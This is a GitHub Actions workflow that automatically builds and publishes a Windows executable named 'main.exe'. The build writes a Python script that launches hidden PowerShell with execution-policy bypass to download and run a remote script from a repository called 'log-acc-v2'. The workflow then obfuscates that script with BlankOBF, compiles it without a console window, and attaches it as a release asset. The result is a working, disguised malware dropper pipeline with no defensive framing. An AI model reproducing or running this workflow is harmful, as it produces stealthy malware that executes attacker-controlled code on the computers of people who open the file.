name: Build with Nuitka and Obfuscation

on:
  push:
    paths:
      - 'run.cmd'
  schedule:
    - cron: '0 0 * * *'  # Runs every day at midnight UTC
  workflow_dispatch:  # Allows manual triggering

permissions:
  contents: write
  pull-requests: write
  repository-projects: write

jobs:
  build:
    runs-on: windows-latest

    steps:
    - name: Checkout repository
      uses: actions/checkout@v2

    - name: Install Python
      uses: actions/setup-python@v2
      with:
        python-version: '3.x'  # Specify your desired Python version

    - name: Install Dependencies
      run: |
        pip install nuitka
        pip install pywin32

    - name: Download BlankOBF
      run: |
        Invoke-WebRequest -Uri https://github.com/Blank-c/BlankOBF/raw/v2/BlankOBFv2.py -OutFile BlankOBFv2.py

    - name: Create and Obfuscate Python Script
      run: |
        echo "import subprocess" > script.py
        echo "subprocess.run(['powershell', '-nop', '-ep', 'bypass', '-c', 'iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex'], creationflags=subprocess.CREATE_NO_WINDOW)" >> script.py
        python BlankOBFv2.py --input script.py --output script_obf.py

    - name: Compile Python Script with Nuitka (No Console)
      run: |
        nuitka --standalone --windows-disable-console script_obf.py

    - name: Delete-tag-and-release
      uses: dev-drprasad/delete-tag-and-release@v1.1
      with:
        tag_name: AutoBuildExe
        delete_release: true
        github_token: ${{ secrets.GITHUB_TOKEN }}

    - name: Create Release
      id: create_release
      uses: actions/create-release@latest
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        tag_name: AutoBuildExe
        release_name: AutoBuildExe
        body: Obfuscated and compiled Python script
        draft: false
        prerelease: false

    - name: Upload Release Asset
      id: upload-release-asset 
      uses: actions/upload-release-asset@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        upload_url: ${{ steps.create_release.outputs.upload_url }}
        asset_path: dist/script_obf.exe
        asset_name: main.exe
        asset_content_type: application/octet-stream
